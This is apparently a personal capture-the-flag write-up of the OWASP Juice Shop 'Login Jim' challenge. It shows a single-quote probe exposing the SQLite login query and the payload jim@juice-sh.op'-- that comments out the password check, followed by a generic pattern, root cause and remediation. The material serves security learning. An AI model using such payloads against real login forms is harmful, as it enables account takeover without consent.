# Challenge: Login Jim

## Category

Injection / SQL Injection

## Platform

OWASP Juice Shop

## Objective

Log in with Jim's user account.

## What I observed

The application has a login endpoint:

```http
POST /rest/user/login
```

The request body contains user-controlled input:

```json
{
  "email": "jim@juice-sh.op",
  "password": "test"
}
```

I first identified Jim's email address by accessing the /administration page after logging in as the administrator. This page exposed Jim's email address:

```text
jim@juice-sh.op
```

Then I tried to log in normally with a wrong password, but the application returned:

```text
Invalid email or password.
```

This confirmed that I had the correct login form and target email, but not the password.

## My initial hypothesis

At first, I thought the challenge might require finding or brute-forcing Jim's password.

However, the challenge hints suggested that the login form itself was the target. This made me focus on SQL injection in the login request instead of password brute force.

## Testing steps

### 1. Test the email field for SQL injection

I sent the login request to Burp Repeater and added a single quote to the email field:

```json
{
  "email": "jim@juice-sh.op'",
  "password": "test"
}
```

The server returned a SQLite error.

The error revealed part of the backend SQL query:

```sql
SELECT * FROM Users
WHERE email = 'jim@juice-sh.op''
AND password = '<hash_of_submitted_password>'
AND deletedAt IS NULL
```

This confirmed that the email input was being inserted into a SQL query.

### 2. Understand the SQL error

The payload broke the query because the email value created an extra quote:

```sql
email = 'jim@juice-sh.op''
```

This caused a SQL syntax error.

This was useful because it confirmed the injection point and showed the structure of the login query.

### 3. Understand the password hash confusion

In the SQL error, I saw a password hash value.

At first, I thought this might be Jim's stored password hash.

After analyzing the query, I understood that this was not Jim's stored password hash. It was the hash of the password I submitted in the login request.

The application hashes the submitted password first, then compares it with the stored password in the database.

So the value in the SQL error represented:

```text
hash(my submitted password)
```

not:

```text
Jim's real password hash
```

### 4. Bypass the password check

The goal was to make the SQL query check only Jim's email and ignore the password condition.

I used a payload that closes the email string and comments out the rest of the query:

```json
{
  "email": "jim@juice-sh.op'--",
  "password": "anything"
}
```

This changes the backend logic from:

```sql
SELECT * FROM Users
WHERE email = 'jim@juice-sh.op'
AND password = '<hash>'
AND deletedAt IS NULL
```

to something like:

```sql
SELECT * FROM Users
WHERE email = 'jim@juice-sh.op'--'
AND password = '<hash>'
AND deletedAt IS NULL
```

Everything after `--` is treated as a SQL comment, so the password check is ignored.

## Result

The challenge was solved after logging in as Jim using a targeted SQL injection payload in the email field.

## Why it worked

The login endpoint inserted the email value directly into a SQL query without safe parameterization.

By closing the email string and commenting out the rest of the SQL query, the password comparison was bypassed.

The database only checked whether a user existed with the target email address.

## Root cause

The root cause is unsafe SQL query construction in the login functionality.

Main issues:

* User-controlled input was inserted into a SQL query.
* The login query could be modified through the email field.
* SQL errors exposed backend query details.
* The password condition could be commented out.
* The application trusted dynamically constructed SQL instead of using parameterized queries.

## Impact in a real application

In a real application, this vulnerability could allow an attacker to:

* Log in as a specific user without knowing the password.
* Bypass authentication.
* Access private account data.
* Perform actions as the compromised user.
* Potentially escalate privileges if an administrator account is targeted.

This is a critical authentication bypass vulnerability.

## Remediation

Recommended fixes:

* Use parameterized queries or prepared statements for login queries.
* Never concatenate user input into SQL statements.
* Return generic error messages instead of detailed SQL errors.
* Apply secure password hashing, such as bcrypt, Argon2, or scrypt.
* Add automated tests for SQL injection in authentication endpoints.
* Monitor suspicious login attempts containing SQL syntax characters such as quotes, comments, or boolean expressions.
* Enforce multi-factor authentication for sensitive accounts.

## What I learned

This challenge taught me the difference between generic and targeted login SQL injection.

A generic login bypass might use a payload that logs in as the first user returned by the database.

A targeted login bypass uses a known email address and comments out the password check to log in as that specific user.

## Mistake I made

When I saw the password hash in the SQL error, I initially thought it might be Jim's stored password hash.

The correct interpretation was that the application was showing the hash of the password I submitted, not Jim's real password.

This taught me to ask:

```text
Is this value coming from the database, or is it my input transformed by the application?
```

## Memory rule

```text
Targeted login SQLi = known email + close quote + comment out password check.
```

For example:

```text
target-email'--
```

## Related patterns

* SQL injection in login forms
* Authentication bypass
* Targeted SQL injection
* SQL error analysis
* Commenting out backend conditions
